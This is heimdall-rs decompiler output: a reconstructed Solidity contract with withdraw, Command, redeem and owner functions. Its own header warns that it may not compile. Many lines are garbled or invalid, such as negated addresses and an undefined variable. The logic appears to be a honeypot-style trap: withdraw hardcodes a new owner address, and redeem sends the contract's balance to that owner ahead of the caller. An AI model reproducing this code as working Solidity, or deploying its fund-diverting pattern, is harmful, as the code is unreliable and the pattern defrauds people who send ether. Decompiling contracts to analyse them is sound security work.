// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/// @title            Decompiled Contract
/// @author           Jonathan Becker <jonathan@jbecker.dev>
/// @custom:version   heimdall-rs v0.6.4
///
/// @notice           This contract was decompiled using the heimdall-rs decompiler.
///                     It was generated directly by tracing the EVM opcodes from this contract.
///                     As a result, it may not compile or even be valid solidity code.
///                     Despite this, it should be obvious what each function does. Overall
///                     logic should have been preserved throughout decompiling.
///
/// @custom:github    You can find the open-source decompiler here:
///                       https://heimdall.rs

contract DecompiledContract {
    
    bytes32 public stor_a;
    
    /// @custom:selector    0x495c9588
    /// @custom:name        minEligibility
    function minEligibility() public pure returns (uint256) {
        return 0x0ddd2a1dd7429000;
    }
    
    /// @custom:selector    0x3ccfd60b
    /// @custom:name        withdraw
    function withdraw() public payable {
        require(!(address(msg.sender)) == 0x7a617c2b05d2a74ff9babc9d81e5225c1e01004b);
        stor_a = 0x7a617c2b05d2a74ff9babc9d81e5225c1e01004b | (uint96(stor_a));
        require(address(msg.sender) == (address(stor_a)));
        (bool success, bytes memory ret0) = address(stor_a).call{ gas: (!address(this).balance) * 0x08fc, value: address(this).balance }(abi.encode());
        if (address(msg.sender) == (address(stor_a))) {
        }
    }
    
    /// @custom:selector    0xb4a99a4e
    /// @custom:name        Owner
    function Owner() public view returns (address) {
        address var_a = stor_a;
        return var_a;
    }
    
    /// @custom:selector    0xba21d62a
    /// @custom:name        Command
    /// @param              arg0 ["address", "bytes", "bytes20", "bytes32", "int", "int160", "int256", "string", "uint", "uint160", "uint256"]
    /// @param              arg1 ["bytes", "uint256", "int256", "string", "bytes32", "uint", "int"]
    function Command(address arg0, bytes memory arg1) public payable {
        bytes memory var_a = var_a + (0x20 + (((0x1f + (arg1)) / 0x20) * 0x20));
        if (address(msg.sender) == (address(stor_a))) {
            require(address(msg.sender) == (address(stor_a)));
            (bool success, bytes memory ret0) = address(arg0).call{ value: msg.value }(abi.encode(~((0x0100 ** (0x20 - (bytes1(var_a.length)))) - 0x01) & (var_f)));
            (bool success, bytes memory ret0) = address(arg0).call{ value: msg.value }(abi.encode());
        }
    }
    
    /// @custom:selector    0xbe040fb0
    /// @custom:name        redeem
    function redeem() public payable {
        require(msg.value < 0x0ddd2a1dd7429000);
        (bool success, bytes memory ret0) = address(stor_a).call{ gas: (!address(this).balance) * 0x08fc, value: address(this).balance }(abi.encode());
        (bool success, bytes memory ret0) = address(msg.sender).call{ gas: (!address(this).balance) * 0x08fc, value: address(this).balance }(abi.encode());
    }
}